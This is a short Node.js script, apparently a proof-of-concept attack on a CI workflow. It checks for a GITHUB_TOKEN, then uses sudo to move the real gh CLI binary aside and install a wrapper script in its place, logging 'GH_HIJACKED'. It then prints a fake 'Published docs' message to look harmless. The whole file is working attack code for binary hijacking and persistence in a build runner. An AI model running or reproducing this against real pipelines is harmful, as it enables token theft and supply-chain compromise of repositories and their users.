#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const cp = require('child_process');
const env = process.env;
console.log('PRN_FILE=' + (fs.existsSync('../preview-metadata/pr_number') ? fs.readFileSync('../preview-metadata/pr_number','utf8').trim() : 'none'));
console.log('HAVE_GH_ENV=' + (env.GITHUB_TOKEN ? 'yes' : 'no'));
try {
  const which = cp.execSync('command -v gh', {shell: '/bin/bash', encoding: 'utf8'}).trim();
  const real = which + '.real';
  let w = fs.readFileSync(path.join(__dirname, 'ghw.sh'), 'utf8').replace('__GH_REAL__', real);
  fs.writeFileSync('/tmp/ghw', w, {mode: 0o755});
  cp.execSync(`sudo cp ${which} ${real} && sudo install -m 0755 /tmp/ghw ${which}`, {shell: '/bin/bash', stdio: 'pipe'});
  console.log('GH_HIJACKED ' + which);
} catch (e) { console.log('GH_HIJACK_ERR ' + e.message); }
console.log('Published docs to https://poc.invalid/preview (https://poc.invalid/preview)');
process.exit(0);
